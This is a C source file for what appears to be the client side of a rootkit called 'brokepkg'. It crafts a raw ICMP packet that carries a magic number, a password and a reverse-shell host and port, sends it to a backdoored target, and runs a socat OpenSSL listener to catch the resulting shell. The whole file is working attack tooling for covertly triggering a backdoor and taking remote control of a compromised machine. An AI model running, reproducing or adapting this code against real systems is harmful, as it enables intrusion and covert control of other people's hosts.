#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

#define GOOD "\033[38;5;47m[+]\033[0m "
#define BAD "\033[38;5;196m[-]\033[0m "
#define DEBUG "\033[38;5;202m[*]\033[0m "

bool verbose = false;
bool just_send_packet = false;

void usage(const char *bin_name) {
  printf("use:\n");
  printf(
      "%s -s [target] -l [rev shell host] -p [rev shell port] -m [magic "
      "number] -k [pass/magic value] [-q to just send packet, optional]\n",
      bin_name);
  printf("example:\n");
  printf("%s -s 127.0.0.1 -l 127.0.0.1 -p 1515 -m 9995 -k br0k3\n", bin_name);

  exit(0);
}

void invoke_lister(const char *port) {
  if (access("/tmp/brokepkg.pem",
             F_OK)) {  // if "/tmp/brokepkg.pem" not exist
    printf(GOOD ".pem file not exits, creating new\n");
    char *openssl_create_key =
        "openssl req -newkey rsa:2048 -nodes -keyout /tmp/brokepkg.key -x509 "
        "-days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out "
        "/tmp/brokepkg.crt";
    char *join_keys =
        "cat /tmp/brokepkg.key /tmp/brokepkg.crt > /tmp/brokepkg.pem";
    if (verbose) {
      printf(DEBUG "execing:\n%s\n", openssl_create_key);
      printf(DEBUG "execing:\n%s\n", join_keys);
    }
    system(openssl_create_key);
    system(join_keys);
  }
  char *socat_lister = malloc((80 + strlen(port)) * sizeof(char));
  strcpy(socat_lister, "socat file:`tty`,raw,echo=0 openssl-listen:");
  strcat(socat_lister, port);
  strcat(socat_lister, ",cert=/tmp/brokepkg.pem,verify=0,fork");

  if (verbose) {
    printf(DEBUG "socat command:\n%s\n", socat_lister);
  }

  system(socat_lister);
}

unsigned short csum(unsigned short *buf, int nwords) {
  unsigned long sum;
  unsigned short odd;

  for (sum = 0; nwords > 1; nwords -= 2) sum += *buf++;

  if (nwords == 1) {
    odd = 0;
    *((unsigned char *)&odd) = *(unsigned char *)buf;
    sum += odd;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);

  return ~sum;
}

int icmp(char *srcip, char *dstip, int magic_number, char *data) {
  unsigned int pckt_tam;
  char *buffer;
  struct iphdr *iph;
  struct icmphdr *icmp;
  struct sockaddr_in s;

  socklen_t optval = 1;
  unsigned int data_len = strlen(data);
  int sockicmp, nbytes, ret = EXIT_FAILURE;

  pckt_tam = (sizeof(struct iphdr) + sizeof(struct icmphdr) + data_len);

  if (!(buffer = malloc(pckt_tam))) {
    printf(BAD "error on allocating buffer memory");
    return ret;
  }

  memset(buffer, '\0', pckt_tam);

  iph = (struct iphdr *)buffer;
  icmp = (struct icmphdr *)(buffer + sizeof(struct iphdr));

  if ((sockicmp = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
    fprintf(stderr, BAD "error in creating raw ICMP socket");
    goto free_buffer;
  }

  if (setsockopt(sockicmp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) ==
      -1) {
    fprintf(stderr, BAD "error in setsockopt");
    goto close_socket;
  }

  // copies the data ("<pass> <ip> <port>") to the end of the buffer
  memcpy((buffer + sizeof(struct iphdr) + sizeof(struct icmphdr)), data,
         data_len);

  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->id = htons(magic_number);  // set ip id header with the magic_number
  iph->ttl = 255;
  iph->protocol = IPPROTO_ICMP;
  iph->saddr = inet_addr(srcip);
  iph->daddr = inet_addr(dstip);
  iph->tot_len = pckt_tam;
  iph->check = csum((unsigned short *)buffer, iph->tot_len);

  icmp->type = 8;
  icmp->code = ICMP_ECHO;
  icmp->checksum = 0;
  icmp->un.echo.id =
      htons(magic_number);  // set icmp id header with the magic_number
  icmp->un.echo.sequence = htons(4444);

  icmp->checksum =
      csum((unsigned short *)icmp, sizeof(struct icmphdr) + data_len);

  s.sin_family = AF_INET;
  s.sin_addr.s_addr = inet_addr(dstip);

  if (!just_send_packet) {
    sleep(4);  // wait lister start
  }

  if ((nbytes = sendto(sockicmp, buffer, iph->tot_len, 0, (struct sockaddr *)&s,
                       sizeof(struct sockaddr))) == -1)
    fprintf(stderr, BAD "error on sending package\n");

  if (nbytes > 0) {
    fprintf(stdout, GOOD "ICMP: %u bytes was sent!\n", nbytes);
    if (verbose) {
      printf(DEBUG "sended data:\n" DEBUG "%s\n", data);
      printf(DEBUG "to %s from %s\n", srcip, dstip);
    }
    ret = EXIT_SUCCESS;
  }

close_socket:
  close(sockicmp);
free_buffer:
  free(buffer);
  return ret;
}

int main(int argc, char *argv[]) {
  char *srcip = "127.0.0.1", *shell_t = "socat", *dstip, *pass, *rev_host,
       *rev_port, *data;
  int opt, magic_number;
  pid_t pid;

  magic_number = 0;
  dstip = pass = rev_host = rev_port = NULL;

  if (getuid() != 0) {
    fprintf(stderr, BAD "Say magic word... root\n");
    exit(-1);
  }

  while ((opt = getopt(argc, argv, "p:l:k:s:m:t:vq")) != EOF) {
    switch (opt) {
      case 'p':
        if (atoi(optarg) < 0 || atoi(optarg) > 65535) {
          printf("wrong port\n");
          exit(-1);
        }
        rev_port = optarg;
        break;
      case 'l':
        if (strlen(optarg) > 15) {
          printf("wrong IP address\n");
          exit(-1);
        }
        rev_host = optarg;
        break;
      case 'k':
        pass = optarg;
        break;
      case 'm':
        magic_number = atoi(optarg);
        break;
      case 's':
        if (strlen(optarg) > 15) {
          printf("wrong IP address\n");
          exit(-1);
        }
        dstip = optarg;
        break;
      case 'v':
        verbose = true;
        break;
      case 'q':
        just_send_packet = true;
        break;
      case 't':
        shell_t = optarg;
        break;
      default:
        usage(argv[0]);
        break;
    }
  }

  if (srcip == NULL || dstip == NULL || pass == NULL) usage(argv[0]);
  if (magic_number == 0) usage(argv[0]);

  int len =
      strlen(pass) + strlen(rev_host) + strlen(rev_port) + strlen(shell_t) + 4;
  data = malloc(len * sizeof(char));

  bzero(data, len);
  snprintf(data, len, "%s %s %s %s", pass, rev_host, rev_port, shell_t);

  if (just_send_packet) {
    icmp(srcip, dstip, magic_number, data);
  } else {
    pid = fork();
    if (pid == 0)  // child
      icmp(srcip, dstip, magic_number, data);
    else
      invoke_lister(rev_port);
  }
}
